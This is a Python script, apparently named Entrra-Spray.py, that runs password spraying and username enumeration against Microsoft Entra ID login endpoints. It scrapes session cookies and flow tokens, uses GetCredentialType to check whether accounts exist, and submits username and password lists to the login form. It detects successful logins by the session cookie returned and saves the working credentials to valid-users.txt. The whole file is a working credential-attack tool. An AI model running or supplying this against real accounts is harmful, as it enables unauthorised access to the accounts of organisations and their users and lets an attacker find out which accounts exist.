import httpx
import re
from urllib.parse import quote_plus
from urllib.parse import unquote, urlparse, parse_qs
import argparse
import getpass
import os

GREEN = "\033[92m"
RED = "\033[91m"
RESET = "\033[0m"
YELLOW = "\033[93m"
BLUE = "\033[94m"

def load_list(input_str):
    if os.path.isfile(input_str):
        with open(input_str, "r") as f:
            return [line.strip() for line in f if line.strip()]
    else:
        return [input_str]

parser = argparse.ArgumentParser(
    description="Spray or test Microsoft login using username(s) and password(s).",
    epilog="Example usage:\n"
           "  python3 Entrra-Spray.py -user users.txt -pass passwords.txt\n"
           "  python3 Entrra-Spray.py -user username@fuck.com -pass 'A'\n"
           "  python3 Entrra-Spray.py -user username@domain.com -pass 'X' -check",
    formatter_class=argparse.RawTextHelpFormatter
)

parser.add_argument("-user", required=True, help="Single username or path to usernames file (TXT)")
parser.add_argument("-pass", dest="password", required=True, help="Single password or path to passwords file (TXT)")
parser.add_argument("-check", action="store_true", help="Enable check mode (checking if Ideneity Exsits in Entra)")

args = parser.parse_args()

usernames = load_list(args.user)
passwords = load_list(args.password)

with open("valid-users.txt", "w") as f:
    pass

for username in usernames:
    for password in passwords:
        
        try:
            url1 = "https://login.microsoftonline.com/"
            headers1 = {
                "Host": "login.microsoftonline.com",
                "Sec-Ch-Ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
                "Sec-Ch-Ua-Mobile": "?0",
                "Sec-Ch-Ua-Platform": '"Windows"',
                "Accept-Language": "en-US,en;q=0.9",
                "Upgrade-Insecure-Requests": "1",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
                "Sec-Purpose": "prefetch;prerender",
                "Purpose": "prefetch",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                "Sec-Fetch-Site": "none",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-User": "?1",
                "Sec-Fetch-Dest": "document",
                "Accept-Encoding": "gzip, deflate, br",
                "Priority": "u=0, i",
            }

            with httpx.Client(timeout=20, http2=True, headers=headers1, follow_redirects=False) as client:
                response = client.get(url1)
                cookies_dict = dict(response.cookies)
                cookies_list = [{"name": name, "value": value} for name, value in cookies_dict.items()]

                for i, cookie in enumerate(cookies_list[:4], 1):  
                    globals()[f"cookie{i}"] = cookie
                    #print(f"Var Created: cookie{i} = {{'name': '{cookie['name']}', 'value': '{cookie['value']}'}}")

            for i in range(1, 5):
                var_name = f"cookie{i}"
                if var_name in globals():
                    cookie = globals()[var_name]
                else:
                    print(f"{var_name}: not found")

        except httpx.ReadTimeout:
            print(f"{RED}[✗] Timeout occurred while connecting to {url1}{RESET}")
        except httpx.RequestError as e:
            print(f"{RED}[✗] Request error: {e}{RESET}")
        except Exception:
            print(f"{RED}[✗] Unexpected error occurred{RESET}")


        try:
            url11 = "https://www.office.com/login"
            headers11 = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            }
            
            with httpx.Client(timeout=20, follow_redirects=False, http2=True, headers=headers11) as client:
                
                response = client.get(url11)
                location = response.headers.get("location")
                if not location:
                    raise Exception("Redirect Location header not found")

            url1 = location + "&sso_reload=true"
            url2 = location
            
            cookie_header = ""
            for i in range(1, 20):  
                var_name = f"cookie{i}"
                if var_name in globals():
                    ck = globals()[var_name]
                    cookie_header += f"{ck['name']}={ck['value']}; "

            cookie_header = cookie_header.strip().rstrip(";")

        except httpx.ReadTimeout:
            print(f"{RED}[✗] Timeout occurred while connecting to {url1}{RESET}")
        except httpx.RequestError as e:
            print(f"{RED}[✗] Request error: {e}{RESET}")
        except Exception:
            print(f"{RED}[✗] Unexpected error occurred{RESET}")


        try: 
            headers2 = {
                "Host": "login.microsoftonline.com",
                "Cookie": cookie_header,
                "Accept-Language": "en-US,en;q=0.9",
                "Upgrade-Insecure-Requests": "1",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                "Sec-Fetch-Site": "none",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-User": "?1",
                "Sec-Fetch-Dest": "document",
                "Sec-Ch-Ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
                "Sec-Ch-Ua-Mobile": "?0",
                "Sec-Ch-Ua-Platform": '"Windows"',
                "Accept-Encoding": "gzip, deflate, br",
                "Priority": "u=0, i"
            }


            with httpx.Client(timeout=20, http2=True, headers=headers2, follow_redirects=False) as client:
                response2 = client.get(url1)
                cookies_dict2 = dict(response2.cookies)
                cookies_list2 = [{"name": name, "value": value} for name, value in cookies_dict2.items()]
                for i, cookie2 in enumerate(cookies_list2[:6], 1):  
                    globals()[f"cookie_url1{i}"] = cookie2
                    #print(f"varb created: cookie_url1{i} = {{'name': '{cookie2['name']}', 'value': '{cookie2['value']}'}}")


            with httpx.Client(timeout=20, http2=True, headers=headers2, follow_redirects=False) as client:
                response3 = client.get(url2)
                cookies_dict3 = dict(response3.cookies)
                cookies_list3 = [{"name": name, "value": value} for name, value in cookies_dict3.items()]
                for i, cookie3 in enumerate(cookies_list3[:1], 1):  
                    globals()[f"cookie_url2{i}"] = cookie3
                    #print(f"varb created: cookie_url2{i} = {{'name': '{cookie3['name']}', 'value': '{cookie3['value']}'}}")


            html = response2.text.replace("\\u0026", "&")

            match_reset = re.search(r'https://passwordreset\.microsoftonline\.com/\?ru=[^"\'>]+', html, re.IGNORECASE)
            if not match_reset:
                raise Exception("Reset URL not found")
                
            decoded_reset = unquote(match_reset.group())
            inner_url = decoded_reset.split("ru=", 1)[-1]
            parsed_inner = urlparse(inner_url)
            ctx = parse_qs(parsed_inner.query).get("ctx", [None])[0]

            match_canary = re.search(r'"canary"\s*:\s*"([^"]+)"', html, re.IGNORECASE | re.DOTALL)
            canary = match_canary.group(1) if match_canary else None

            match_flow = re.search(r'"sFT"\s*:\s*"([^"]+)"', html, re.IGNORECASE | re.DOTALL)
            flowtoken = match_flow.group(1) if match_flow else None


        except httpx.ReadTimeout:
            print(f"{RED}[✗] Timeout occurred while connecting to {url1}{RESET}")
        except httpx.RequestError as e:
            print(f"{RED}[✗] Request error: {e}{RESET}")
        except Exception:
            print(f"{RED}[✗] Unexpected error occurred{RESET}")
            
        
        try: 
            url99 = "https://login.microsoftonline.com/common/GetCredentialType"

            headers99 = {
                "Host": "login.microsoftonline.com",
                "Sec-Ch-Ua-Platform": '"Windows"',
                "Hpgid": "1104",
                "Accept-Language": "en-US,en;q=0.9",
                "Sec-Ch-Ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
                "Hpgact": "1800",
                "Sec-Ch-Ua-Mobile": "?0",
                "Client-Request-Id": "392cfe57-cd73-4e1e-a3e4-768e5dc0574c",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
                "Accept": "application/json",
                "Hpgrequestid": "79994791-4414-40de-9014-ef5533da1700",
                "Content-Type": "application/json; charset=UTF-8",
                "Origin": "https://login.microsoftonline.com",
                "Sec-Fetch-Site": "same-origin",
                "Sec-Fetch-Mode": "cors",
                "Accept-Encoding": "gzip, deflate, br",
                "Priority": "u=1, i"
            }

            payload99 = {
                "username": f"{username}",
                "flowToken": f"{flowtoken}"
            }

            if args.check:
                try:
                    with httpx.Client(timeout=20, http2=True ) as client:
                        response = client.post(url99, headers=headers99, json=payload99)
                        if '"FederationRedirectUrl"' in response.text:
                            try:
                                federation_url = response.json().get("FederationRedirectUrl")
                                if federation_url:
                                    print(f"{BLUE}[!] Can not enumeration if username is exist {RESET}")
                            except Exception:
                                print(f"{RED}[✗] Unexpected error occurred{RESET}")
                                pass

                        if '"IfExistsResult":0' in response.text:
                            pass
                        else:
                            print(f"{RED}[✗] Username: {username} not exists{RESET}")
                            continue
                            
                except httpx.ReadTimeout:
                    print(f"{RED}[✗] Request timed out while checking user: {username}{RESET}")
                    continue

                except httpx.RequestError as e:
                    print(f"{RED}[✗] Request error for {username}: {e}{RESET}")
                    continue
    
        except httpx.ReadTimeout:
            print(f"{RED}[✗] Timeout occurred while connecting to {url1}{RESET}")
        except httpx.RequestError as e:
            print(f"{RED}[✗] Request error: {e}{RESET}")
        except Exception:
            print(f"{RED}[✗] Unexpected error occurred{RESET}")
            
            
        try: 
            url123 = "https://login.microsoftonline.com/common/login"
            headers123 = {
                "Host": "login.microsoftonline.com",
                "Cache-Control": "max-age=0",
                "Sec-Ch-Ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
                "Sec-Ch-Ua-Mobile": "?0",
                "Sec-Ch-Ua-Platform": '"Windows"',
                "Accept-Language": "en-US,en;q=0.9",
                "Origin": "https://login.microsoftonline.com",
                "Content-Type": "application/x-www-form-urlencoded",
                "Upgrade-Insecure-Requests": "1",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                "Sec-Fetch-Site": "same-origin",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-User": "?1",
                "Sec-Fetch-Dest": "document",
                "Priority": "u=0, i",
            }

            cookies_string = f"""{cookie_url11['name']}={cookie_url11['value']}&AADSSO=NA|NoExtension&SSOCOOKIEPULLED=1&{cookie_url12['name']}={cookie_url12['value']}&{cookie_url13['name']}={cookie_url13['value']}&{cookie_url14['name']}={cookie_url14['value']}&{cookie_url15['name']}={cookie_url15['value']}&{cookie_url21['name']}={cookie_url21['value']}&MicrosoftApplicationsTelemetryDeviceId=31776052-89f1-4caf-82a2-4ccf2a9b7f37"""

            cookies123 = dict(cookie.split("=", 1) for cookie in cookies_string.split("&"))

            canary = quote_plus(f"{canary}")
            ctx = quote_plus(f"{ctx}")
            flowToken = quote_plus(f"{flowtoken}")

            data123 = f"""login={username}&loginfmt={username}&type=11&LoginOptions=3&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={password}&canary={canary}&ctx={ctx}&flowToken={flowToken}"""  
            try:
                with httpx.Client(timeout=20, http2=True ) as client:
                    response123 = client.post(url123, headers=headers123, cookies=cookies123, data=data123)
                    cookies_dict = dict(response123.cookies)
                    if args.check:
                        if "ESTSAUTHPERSISTENT" in cookies_dict:
                            print(f"{GREEN}[✓] success: User {username} is exist and seccessfully logged in with password: {password}")
                            with open("valid-users.txt", "a") as log_file:
                                log_file.write(f"{username}:{password}\n")
                            break            
                        else:
                            if "<html><head><title>Working...</title></head>" in response123.text:
                                print(f"{GREEN}[✓] success: {username} logged in with password: {password}, with Redirect Page to..")
                                with open("valid-users.txt", "a") as log_file:
                                    log_file.write(f"{username}:{password}\n")
                                break
                            else:
                                print(f"{YELLOW}[!] NOT-success: {username} exists, but password is incorrect: {password}")
                                with open("valid-users.txt", "a") as log_file:
                                    log_file.write(f"{username}\n")
                                
                    else :
                        if "ESTSAUTHPERSISTENT" in cookies_dict:
                            print(f"{GREEN}[✓] success: User {username} is exist and seccessfully logged in with password: {password}")
                            with open("valid-users.txt", "a") as log_file:
                                log_file.write(f"{username}:{password}\n")
                            break            
                        else:
                            if "<html><head><title>Working...</title></head>" in response123.text:
                                print(f"{GREEN}[✓] success: {username} logged in with password: {password}, with Redirect Page to..")
                                with open("valid-users.txt", "a") as log_file:
                                    log_file.write(f"{username}:{password}\n")
                                break
                            else:
                                print(f"{YELLOW}[!] NOT-success to authenticate with {username}, didn't check if user exists")   

            except httpx.ReadTimeout:
                print(f"{RED}[✗] Request timed out while checking user: {username}{RESET}")
                continue

            except httpx.RequestError as e:
                print(f"{RED}[✗] Request error for {username}: {e}{RESET}")
                continue
           
        
        except httpx.ReadTimeout:
            print(f"{RED}[✗] Timeout occurred while connecting to {url1}{RESET}")
        except httpx.RequestError as e:
            print(f"{RED}[✗] Request error: {e}{RESET}")
        except Exception:
            print(f"{RED}[✗] Unexpected error occurred{RESET}")
        
         
print(f"{BLUE} seccess Logs written to valid-users.txt {RESET}")
